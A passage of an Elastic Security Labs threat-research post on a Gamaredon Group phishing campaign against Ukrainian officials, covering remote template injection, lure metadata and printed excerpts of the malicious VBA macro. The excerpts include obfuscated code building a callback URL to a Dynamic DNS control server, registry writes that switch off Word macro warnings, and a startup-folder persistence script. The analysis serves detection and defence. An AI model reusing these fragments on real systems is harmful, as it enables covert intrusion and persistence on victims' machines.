<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Playing defense against Gamaredon Group — Elastic Security Labs</title><meta name="description" content="Learn about the recent campaign of a Russia-based threat group known as Gamaredon Group.  This post will review these details and provide detection strategies."/><meta property="og:title" content="Playing defense against Gamaredon Group — Elastic Security Labs"/><meta property="og:description" content="Learn about the recent campaign of a Russia-based threat group known as Gamaredon Group.  This post will review these details and provide detection strategies."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/playing-defense-against-gamaredon-group/blog-thumb-digital-shield.jpg?f1ac64183d5ef4c66ccea98364c25f9e"/><meta property="og:image:alt" content="Learn about the recent campaign of a Russia-based threat group known as Gamaredon Group.  This post will review these details and provide detection strategies."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/playing-defense-against-gamaredon-group"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Playing defense against Gamaredon Group — Elastic Security Labs"/><meta name="twitter:description" content="Learn about the recent campaign of a Russia-based threat group known as Gamaredon Group.  This post will review these details and provide detection strategies."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/playing-defense-against-gamaredon-group/blog-thumb-digital-shield.jpg?f1ac64183d5ef4c66ccea98364c25f9e"/><meta name="twitter:image:alt" content="Learn about the recent campaign of a Russia-based threat group known as Gamaredon Group.  This post will review these details and provide detection strategies."/><link rel="canonical" href="https://www.elastic.co/security-labs/playing-defense-against-gamaredon-group"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-6099969c8d0667dd.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/zgtdq_G6IdLL0e41oqL5l/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/zgtdq_G6IdLL0e41oqL5l/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/playing-defense-against-gamaredon-group"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/playing-defense-against-gamaredon-group"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2022-06-21T00:00:00.000Z">21 June 2022</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/daniel-stepanic">Daniel Stepanic</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/andrew-pease">Andrew Pease</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/seth-goodwin">Seth Goodwin</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/elastic-security-intelligence-analytics-team">Elastic Security Intelligence &amp; Analytics Team</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Playing defense against Gamaredon&nbsp;Group</span></h1><p class="text-zinc-200 text-base md:text-xl">Learn about the recent campaign of a Russia-based threat group known as Gamaredon Group.  This post will review these details and provide detection strategies.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>33 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/activity-group">Activity group</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Playing defense against Gamaredon Group" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fplaying-defense-against-gamaredon-group%2Fblog-thumb-digital-shield.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><p>For several months, the Intelligence &amp; Analytics team at Elastic Security has tracked an ongoing adversary campaign appearing to target Ukranian government officials. Based on our monitoring, we believe <a href="https://attack.mitre.org/groups/G0047/">Gamaredon Group</a>, a suspected Russia-based threat group, is behind this campaign. Our observations suggest a significant overlap between tactics, techniques, and procedures (TTPs) included within this campaign and <a href="https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine">public reporting</a><sup>1</sup>.</p>
<p>This campaign has produced and deployed updated lures on a near-daily basis that appear to target multiple Ukrainian government departments. With this high operational tempo and aggressive targeting, they consistently employ a cluster of initial access techniques and procedures. Over the past four months, these techniques have consisted of spearphishing, remote document template injection, startup folder persistence, VBA/VBScript languages, and Dynamic DNS command &amp; control infrastructure.</p>
<p>In this post, we’ll walk through the campaign details, reviewing the implementation while also providing solutions such as detection strategies through the use of Elastic’s <a href="https://www.elastic.co/blog/introducing-event-query-language">Event Query Language (EQL)</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="campaign-details" class="absolute -top-32"></span>Campaign Details</h2>
<p>The earliest identified <a href="https://www.virustotal.com/gui/domain/libre-templates.ddns.net/details">infrastructure</a> indicates this campaign has been active since August 2019. The first <a href="https://www.virustotal.com/gui/file/481eee236eadf6c947857820d3af5a397caeb8c45791f0bbdd8a21f080786e75/details">sample</a> leveraging this domain was submitted to VirusTotal in early September 2019. Spearphishing emails like the example in Figure 1 (below) were used to deliver a malicious attachment and demonstrate Gamaredon Group’s attempt to impersonate an anti-corruption activist. This example targeted the National Security and Defense Council of Ukraine and dates to January 17, 2020.</p>
<p></p>
<p><em>Figure 1 - Spearphishing email sent to National Security and Defense Council of Ukraine</em></p>
<p>A typical lure document might masquerade as an information request to the Ministry of Foreign Affairs of Ukraine. These manufactured lures included official logos stolen from governmental offices of Ukraine and impersonated diplomats known to their targets.</p>
<p></p>
<p><em>Figure 2 - Lure document - Ministry of Foreign Affairs in Ukraine request</em></p>
<p>To improve their chances of success, they customize the request around the same date of the campaign and include urgent requests for action. These efforts are indicative of necessity.</p>
<p></p>
<p><em>Figure 3 - Lure document - Information request related to NSDC Head of Ukraine</em></p>
<p>Often, the call to action first required the victim to open an attached lure document. A user who attempted to open one of these malicious attachments would see a perfectly convincing decoy document, while a sequence of invisible actions occurred behind the screen. These documents end up leveraging a technique known as <a href="https://attack.mitre.org/techniques/T1221/">template injection</a>, a method of loading remotely hosted Microsoft Word document templates.</p>
<p>Microsoft Word objects function similarly to compressed archives and have properties defined using Microsoft’s Open Office XML (OOXML) format. Within the decompressed word/_rels/ subdirectory, the file settings.xml.rels contained a network location where a remotely hosted template was retrieved as depicted in Figure 4.</p>
<p></p>
<p><em>Figure 4 - Excerpt from Settings.xml.rels</em></p>
<p>Each external URL within these lures were configured to point to Dynamic DNS providers (ddns.net, hopto.org). Dynamic DNS provides automation around updating a name server in the Domain Name System (DNS). By adopting this technique, this shows the adversary’s attempt to mask their ownership and obscure atomic indicator associations through the use of transient infrastructures, such as Dynamic DNS.</p>
<p></p>
<p><em>Figure 5 - Word startup screen showing download of remote document template</em></p>
<p>The remote templates are macro-enabled, configured to execute VBA macro code that persists a VBScript object in the victim’s startup folder as a foothold. We assess the objective of this initial code is used to identify the victim and to protect the second-stage payload that is intended only for their targeted victims. In the next sections, we will review the document’s metadata and macro code found in a recent <a href="https://www.virustotal.com/gui/file/feb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f/details">sample</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="document-metadata-analysis" class="absolute -top-32"></span>Document metadata analysis</h2>
<p>In malicious campaigns, infrastructure is commonly created for specific targets. This serves multiple purposes, but frequently it’s done to track implants and frustrate automated research and analysis. As analysts, this gives us some insight into the adversaries’ maturity, experience, and resources. As an example, an adversary who reuses lure documents or templates may be less experienced, not interested in high-value targets, or using monetized infrastructure from previous campaigns.</p>
<p>Analyzing the metadata from the lure document and template allows us to see when these weaponized documents were created, as well as identify any associations between different elements of the campaign.</p>
<p>As we can see in Figure 6, the lure document was created on December 24, 2019 by the Author “ШУРИК”. In Figure 7, we can see that the Author is the same as observed in the lure document (ШУРИК). Additionally, we can see that the remote template was created on December 12, 2019 and then modified on December 24, 2019. There were 5 modifications to it, indicating that it has been used for 5 campaigns in 12 days — or about 2.5 days per campaign. With moderate confidence, this tells us that the remote template is likely reused and updated with new macros for new campaigns, and that they were created by the same Author (or at a minimum, the same instance of Microsoft Word).</p>
<p>As an analyst note, we see different tool markings that indicate this was created by a Russian speaker (Russian Author, Russian Language Code, Cyrillic character set, and the usage of Reanimator Extreme Edition). While we can use those as information to help inform overall analysis, this information can be seeded — so it doesn’t prove anything definitively on its own. In this case, this aligns with other open source analysis linking this to the Gamaredon Group, which is believed to be Russian in origin.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>File Size</td><td>46 kB</td></tr><tr><td>File Type Extension</td><td>docx</td></tr><tr><td>MIME Type</td><td>application/vnd.openxmlformats-officedocument.wordprocessingml.document</td></tr><tr><td>Last Modified By</td><td>ШУРИК</td></tr><tr><td>Revision Number</td><td>2</td></tr><tr><td>Create Date</td><td>2019:12:24 15:58:00Z</td></tr><tr><td>Modify Date</td><td>2019:12:24 16:10:00Z</td></tr><tr><td>Template</td><td>pos.dot</td></tr><tr><td>Total Edit Time</td><td>2 minutes</td></tr><tr><td>Pages</td><td>1</td></tr><tr><td>Words</td><td>195</td></tr><tr><td>Characters</td><td>1114</td></tr><tr><td>Application</td><td>Microsoft Office Word</td></tr><tr><td>Lines</td><td>9</td></tr><tr><td>Paragraphs</td><td>2</td></tr><tr><td>Company</td><td>Reanimator Extreme Edition</td></tr><tr><td>Characters With Spaces</td><td>1307</td></tr></tbody></table></div>
<p><em>Figure 6 - Metadata from the lure document (truncated for length)</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>File Size</td><td>44 kB</td></tr><tr><td>File Type Extension</td><td>doc</td></tr><tr><td>MIME Type</td><td>application/msword</td></tr><tr><td>Language Code</td><td>Russian</td></tr><tr><td>Author</td><td>ШУРИК</td></tr><tr><td>Template</td><td>pos.dot</td></tr><tr><td>Last Modified By</td><td>ШУРИК</td></tr><tr><td>Software</td><td>Microsoft Office Word</td></tr><tr><td>Create Date</td><td>2019:12:12 11:48:00</td></tr><tr><td>Modify Date</td><td>2019:12:24 10:30:00</td></tr><tr><td>Code Page</td><td>Windows Cyrillic</td></tr><tr><td>Company</td><td>Reanimator Extreme Edition</td></tr><tr><td>Char Count With Spaces</td><td>0</td></tr><tr><td>Revision Number</td><td>5</td></tr><tr><td>Total Edit Time</td><td>0</td></tr><tr><td>Words</td><td>0</td></tr><tr><td>Characters</td><td>0</td></tr><tr><td>Pages</td><td>1</td></tr><tr><td>Paragraphs</td><td>1</td></tr><tr><td>Lines</td><td>1</td></tr></tbody></table></div>
<p><em>Figure 7 - Metadata from the remote template (truncated for length)</em></p>
<p>While we cannot state with any authority, searching for the Author “ШУРИК” has identified similar TTPs (lure documents with remote template injection) as far back as September of 2019.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="macro-code-analysis" class="absolute -top-32"></span>Macro code analysis</h2>
<p>The macro code was obfuscated using string concatenation and procedurally generated variables — techniques that are often used to bypass static detection technologies. Upon execution, this code provides reverse shell functionality that allows an adversary access to the victim’s system and capability to access shared resources on their local network. Figure 8 contains an excerpt of the macro that depicts the creation of a reverse shell and some of the system information collected automatically.</p>
<pre><code>Dim NoARzTHy
NoARzTHy = &quot;Set WShell=CreateObject(&quot;&quot;WSc&quot; + &quot;ri&quot; + &quot;pt.S&quot; + &quot;hel&quot; + &quot;l&quot;&quot;)&quot;
Set PWFJWatF = CreateObject(&quot;WScr&quot; + &quot;ipt.Ne&quot; + &quot;two&quot; + &quot;rk&quot;)
Dim pbuvwTLK, JzESywut
Set GGZucIZE = CreateObject(&quot;Sc&quot; + &quot;rip&quot; + &quot;ting.Fi&quot; + &quot;leSy&quot; + &quot;stemOb&quot; + &quot;ject&quot;)
pbuvwTLK = GGZucIZE.Drives(Environ(&quot;Syst&quot; + &quot;emDri&quot; + &quot;ve&quot;)).SerialNumber
OYTgBXAP = PWFJWatF.ComputerName</code></pre>
<p><em>Figure 8 - First 7 lines of macro code from the loaded document template</em></p>
<p>Figure 9 shows an excerpt of the same code removing the concatenation.</p>
<pre><code>Dim NoARzTHy
NoARzTHy = &quot;Set WShell=CreateObject(&quot;WScript.Shell&quot;)&quot;
Set PWFJWatF = CreateObject(&quot;WScript.Network&quot;)
Dim pbuvwTLK, JzESywut
Set GGZucIZE = CreateObject(&quot;Scripting.FileSystemObject&quot;)
pbuvwTLK = GGZucIZE.Drives(Environ(&quot;SystemDrive&quot;)).SerialNumber
OYTgBXAP = PWFJWatF.ComputerName</code></pre>
<p><em>Figure 9 - First 7 lines of macro code - Removal of concatenation</em></p>
<p>The serial number and hostname of the victim&#x27;s computer are some of the first pieces of information the VBA collects. They are converted to hexadecimal and included in the reverse shell HTTP request to identify both the implant and the victim. Figure 10 shows off the configuration of the URI request within the macro and Figure 11 represents an example URI.</p>
<pre><code>JzESywut = &quot;h&quot; + &quot;tt&quot; + &quot;p:&quot; + &quot;//l&quot; + &quot;ibcr&quot; + &quot;ash.dd&quot; + &quot;ns.ne&quot; + &quot;t/&quot; &amp; OYTgBXAP &amp; &quot;_&quot; &amp; HFzesifc &amp; &quot;//po&quot; + &quot;sol&quot; + &quot;re&quot; + &quot;boo&quot; + &quot;t.ph&quot; + &quot;p&quot;</code></pre>
<p><em>Figure 10 - URI request configuration - Macro</em></p>
<pre><code>JzESywut = hxxp://libcrash.ddns[.]net/ENDPOINT1_96L02G3D//posolreboot.php</code></pre>
<p><em>Figure 11 - URI request configuration - Example</em></p>
<p>By default, Microsoft disables external or untrusted macros by setting key values in the registry at HKCU\Software\Microsoft\Office(VERSION)\Word\Security. The first registry modification made by this macro changes the key value of AccessVBOM to 1, effectively bypassing the default setting to enable external or untrusted macros. The second registry modification enables all macros automatically and disables warnings for future macro-enabled objects. Figure 12 represents the macro code for these registry modifications.</p>
<pre><code>FEDzCjgi$ = &quot;HKEY_CURRENT_USER\Software\Microsoft\Office\&quot; &amp; Application.Version &amp; _&quot;\Word\Security\&quot;
CreateObject(&quot;WScript.Shell&quot;).RegWrite FEDzCjgi$ &amp; &quot;AccessVBOM&quot;, 1, &quot;REG_DWORD&quot;
CreateObject(&quot;WScript.Shell&quot;).RegWrite FEDzCjgi$ &amp; &quot;VBAWarnings&quot;, 1, &quot;REG_DWORD&quot;</code></pre>
<p><em>Figure 12 - Registry modifications found in macro</em></p>
<p>The remaining lines of code end up writing a VBScript file and placing it in the user’s startup directory. Figure 13 contains an excerpt of the beginning lines of macro code where the VBScript (security.vbs) is written to disk and placed in the startup folder.</p>
<pre><code>Dim LISPVdZd As Object
Set LISPVdZd = GGZucIZE.CreateTextFile(FESHWDaD + &quot;\Mi&quot; + &quot;croso&quot; + &quot;ft\Wi&quot; + &quot;ndow&quot; + &quot;s\St&quot; + &quot;art Men&quot; + &quot;u\Pro&quot; + &quot;grams\Sta&quot; + &quot;rtup\secur&quot; + &quot;ity.v&quot; + &quot;b&quot; + &quot;s&quot;, True, True)</code></pre>
<p><em>Figure 13 - Macro code writing VBScript file (security.vbs)</em></p>
<p>Upon rebooting or successfully authenticating to an infected system, the persistent VBScript file is automatically executed and a standard HTTP GET is made with the previously observed URI (Figure 14). If the request is successful, the response body gets stored into another variable. This functionality appears to serve as a downloader that has specific subroutine instructions for reassembling a binary on disk. Figure 14 contains an excerpt of the function used to construct the HTTP GET request.</p>
